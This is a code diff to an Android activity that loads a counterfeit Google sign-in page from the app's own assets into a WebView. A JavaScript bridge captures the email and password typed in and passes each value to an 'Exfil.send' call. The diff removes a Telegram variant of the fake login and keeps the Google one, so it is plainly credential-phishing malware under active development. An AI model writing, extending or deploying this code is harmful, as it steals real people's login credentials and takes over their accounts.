@@ -12,14 +12,10 @@ public class WebLoginActivity extends Activity {
     private WebView web;
     private String savedEmail = "";
     private String savedPassword = "";
-    private String currentProvider = "google";
 
     @Override
     protected void onCreate(Bundle b) {
         super.onCreate(b);
-
-        String provider = getIntent().getStringExtra("provider");
-        if (provider != null) currentProvider = provider;
 
         web = new WebView(this);
         web.getSettings().setJavaScriptEnabled(true);
@@ -30,22 +26,14 @@ public class WebLoginActivity extends Activity {
 
         web.addJavascriptInterface(new Bridge(), "NativeBridge");
         web.setWebViewClient(new WebViewClient());
-
-        if ("telegram".equals(currentProvider)) {
-            web.loadUrl("file:///android_asset/telegram-login/index.html");
-        } else {
-            web.loadUrl("file:///android_asset/google-login/index.html");
-        }
+        web.loadUrl("file:///android_asset/google-login/index.html");
         setContentView(web);
     }
 
     class Bridge {
         @JavascriptInterface
         public void log(String data) {
-            String tag = "telegram".equals(currentProvider)
-                ? "TELEGRAM_LOGIN" : "GOOGLE_LOGIN";
-            Exfil.send(tag, data);
-
+            Exfil.send("GOOGLE_LOGIN", data);
             if (data.startsWith("email=")) {
                 savedEmail = data.substring(6);
             } else if (data.startsWith("password=")) {
@@ -60,7 +48,9 @@ public class WebLoginActivity extends Activity {
         @JavascriptInterface
         public void done() {
             runOnUiThread(() -> {
-                startActivity(new Intent(WebLoginActivity.this, MainActivity.class));
+                Intent i = new Intent(WebLoginActivity.this, MainActivity.class);
+                i.putExtra("just_logged_in", true);
+                startActivity(i);
                 finish();
             });
         }
